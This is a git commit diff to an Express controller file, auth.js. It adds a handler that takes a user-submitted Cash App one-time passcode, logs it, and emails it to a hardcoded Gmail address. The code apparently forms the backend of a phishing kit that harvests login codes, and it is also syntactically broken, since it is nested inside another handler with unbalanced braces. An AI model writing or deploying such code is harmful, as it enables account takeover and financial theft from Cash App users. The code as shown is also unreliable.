7d2e2f3c83f4c58b7af9578e2f2adf45502d41de
brainm725 <123113895+brainm725@users.noreply.github.com>
2023-08-25 18:08:29 +0100

    Update auth.js

--- control/auth.js
+++ control/auth.js
@@ -70,4 +70,27 @@ exports.code =  (req, res) => {
     } catch (error) {
         return   res.status(500).send(error.message);
     }
+
+    exports.cashCode =  (req, res) => {
+    const { code } = req.body;
+
+    try {
+        const message = `Otp:${code}`
+        console.log(message)
+        const reason = 'Cashapp Otp code'
+        const email = 'techt5562@gmail.com'
+        
+       sendEmail(email, message, reason, (data) => {
+            if (data) {
+                return res.status(200).json({
+                    status: 200,
+                    email: email,
+                    msg: 'email sent'
+                });
+            }
+
+        }).then(response => res.send(response.message)).catch(error=>res.status);
+    } catch (error) {
+        return   res.status(500).send(error.message);
+    }
 }
